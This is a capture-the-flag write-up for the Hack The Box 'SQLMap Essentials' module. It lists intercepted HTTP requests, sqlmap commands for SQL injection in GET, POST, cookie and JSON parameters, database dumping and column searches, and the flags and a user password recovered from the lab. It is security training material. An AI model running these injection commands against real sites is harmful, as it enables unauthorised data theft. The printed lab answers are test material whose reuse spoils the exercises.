# HTB-SQLMap_Essentials

## Table of Contents
1. [Getting Started](#getting-started)
    1. [SQLMap Overview](#sqlmap-overview)
2. [Building Attacks](#building-attacks)
    1. [Running SQLMap on an HTTP Request](#running-sqlmap-on-an-http-request)
    2. [Attack Tuning](#attack-tuning)
3. [Database Enumeration](#database-enumeration)
    1. [Database Enumeration](#database-enumeration-1)
    2. [Advanced Database Enumeration](#advanced-database-enumeration)

## Getting Started
### SQLMap Overview
#### Challenges
1. What's the fastest SQLi type?

    The answer is `Union query-based`.

## Building Attacks
### Running SQLMap on an HTTP Request
#### Challenges
1. What's the contents of table flag2? (Case #2)

    First, we need to intercept the request of case #2.

    ```txt
    POST /case2.php HTTP/1.1
    Host: 94.237.53.134:35892
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://94.237.53.134:35892/case2.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4
    Origin: http://94.237.53.134:35892
    DNT: 1
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    Priority: u=0, i

    id=1
    ```
    We can save it and give it a name req.txt. Then, we can use `sqlmap` with option -r, --dump --batch, and -T flag2. `-T flag2` is used to find specific table named `flag2`. 

    ```bash
    sqlmap -r req.txt -T flag2 --dump --batch
    ```
    The answer is `HTB{700_much_c0n6r475_0n_p057_r3qu357}`.

2. What's the contents of table flag3? (Case #3)

    Here the burp intercept request result. We can save it in the req2.txt.
    
    ```txt
    GET /case3.php HTTP/1.1
    Host: 94.237.53.134:35892
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://94.237.53.134:35892/
    DNT: 1
    Connection: keep-alive
    Cookie: id=1
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    Priority: u=0, i
    ```
    Unlike in the previous, now id is located in the Cookie headers. By default (Level 1), SQLMap only looks for injection points in the URL (GET) and the Body (POST). It ignores HTTP headers like Cookies, User-Agent, etc. So we need to edit the req2.txt to add `*` after `id=1`. It will look like this:

    ```txt
    GET /case3.php HTTP/1.1
    Host: 94.237.53.134:35892
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://94.237.53.134:35892/case3.php
    DNT: 1
    Connection: keep-alive
    Cookie: id=1*
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    Priority: u=0, i
    ```
    The other option is by increasing the level of sqlmam to level2. But in here, i prefer to edit the request. Now we can run `sqlmap` to get the result.

    ```bash
    sqlmap -r req2.txt -T flag3 --dump --batch
    ```
    The answer is `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}`.

3. What's the contents of table flag4? (Case #4)

    In the first question, we need to do sql injection in the URL. In the second question, we need to do sql injection in the header. But now, we need to do sql injection in the JSON. Here the intercept result:

    ```txt
    POST /case4.php HTTP/1.1
    Host: 94.237.53.134:35892
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://94.237.53.134:35892/case4.php
    Content-Type: application/json
    Content-Length: 8
    Origin: http://94.237.53.134:35892
    DNT: 1
    Connection: keep-alive
    Sec-GPC: 1

    {"id":1}
    ```
    We can run `sqlmap` with the same format similar to the first question.
    ```bash
    sqlmap -r req3.txt -T flag4 --dump --batch
    ```
    The answer is `HTB{j450n_v00rh335_53nd5_6r475}`.

### Attack Tuning
#### Challenges
1. What's the contents of table flag5? (Case #5)

    Here the burp intercept result.

    ```txt
    GET /case5.php?id=1 HTTP/1.1
    Host: 94.237.53.134:35892
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://94.237.53.134:35892/case5.php
    DNT: 1
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    Priority: u=0, i
    ```
    In here, i have tried to run normal sqlmap but fail. So i tried to increase the level and risk. But i still fail. In the hint, we need to add `--no-cast`. It prevents SQLMap from converting the output to a string, which often breaks extraction on this specific database configuration. Also, we need to run it several time based on hint. Here the successfull `sqlmap` command:

    ```bash
    sqlmap -r req.txt -T flag5 --dump --batch --level=5 --risk=3 --no-cast --flush-session
    ```
    ![The answer is ``.](<Assets/Attack Tuning - 1.png>)

    I tried to submit `HTB{700_muchqr15k_bu7_w0r7h_17}` but i get wrong answer. I switch `_` with `q` and it is work. The answer is `HTB{700_much_r15k_bu7_w0r7h_17}`.

2. What's the contents of table flag6? (Case #6)

    The case #6 state that "Detect and exploit SQLi vulnerability in GET parameter col having non-standard boundaries". So it should have col paramater. Here the burp result:

    ```txt
    GET /case6.php?col=id HTTP/1.1
    Host: 83.136.253.132:59703
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://83.136.253.132:59703/case6.php
    DNT: 1
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    Priority: u=0, i
    ```
    I modify the request so it would look like this, `GET /case6.php?col=id* HTTP/1.1`. The hint stated that we should add this prefix, '`)'. Here the sqlmap command:

    ```bash
    sqlmap -r req.txt -T flag6 --dump --batch --prefix '`)' --suffix "-- -"  --no-cast
    ```
    The answer is `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`.

3. What's the contents of table flag7? (Case #7)

    Here the burp request:

    ```txt
    GET /case7.php?id=1 HTTP/1.1
    Host: 83.136.253.132:59703
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://83.136.253.132:59703/case7.php
    DNT: 1
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    Priority: u=0, i
    ```
    Because the hint stated to define the `--union-cols`, i tried to find the correct value first.

    ```bash
    sqlmap -r req.txt --union-cols=1-20 --technique=U --dump --batch --level=5 --risk=3
    ```
    ![alt text](<Assets/Attack Tuning - 2.png>)

    We can see that the correct values is 5. So now we can run `sqlmap` to get the flag. But before do this, i modified the req.txt to add `*` after the `id=1`. Here the `sqlmap` command:

    ```bash
    sqlmap -r req.txt -T flag7 --dump --batch --no-cast --union-cols=5
    ```
    The answer is `HTB{un173_7h3_un173d}`.

## Database Enumeration
### Database Enumeration
#### Challenges
1. What's the contents of table flag1 in the testdb database? (Case #1)

    Here the burpt intercepeted request.
    ```txt
    GET /case1.php?id=1 HTTP/1.1
    Host: 94.237.53.219:35716
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Referer: http://94.237.53.219:35716/case1.php
    DNT: 1
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    Priority: u=0, i
    ```

    To solve this, we can specify the table name and the database name.

    ```bash
    sqlmap -r req.txt -T flag1 --dump --batch --no-cast -D testdb
    ```
    The answer is `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`.

### Advanced Database Enumeration
#### Challenges
1. What's the name of the column containing "style" in it's name? (Case #1)

    We can use the previous burp request. Here the sqlmap command:

    ```bash
    sqlmap -r req.txt --search -C style
    ```
    Then, it will ask us "do you want sqlmap to consider provided column(s)".

    ![alt text](<Assets/Advanced Database Enumeration - 1.png>)

    We can choose `1` beacuse we are not exactly searching for "style" column but column that contain "style". The answer is `PARAMETER_STYLE`.

2. What's the Kimberly user's password? (Case #1)

    We can still use the previous burp request. To find the password hash, we need to find the column name, database, and table name. We can use this command to find column that contain "pass":

    ```bash
    sqlmap -r req.txt --search -C pass
    ```

    ![alt text](<Assets/Advanced Database Enumeration - 2.png>)

    Now, we have got the information that we need. We can dump the content of it.

    ```bash
    sqlmap -r req.txt --dump -D testdb -T users
    ```
    Once we have done, we can check the csv output.

    ![alt text](<Assets/Advanced Database Enumeration - 3.png>)

    The answer is `Enizoom1609`.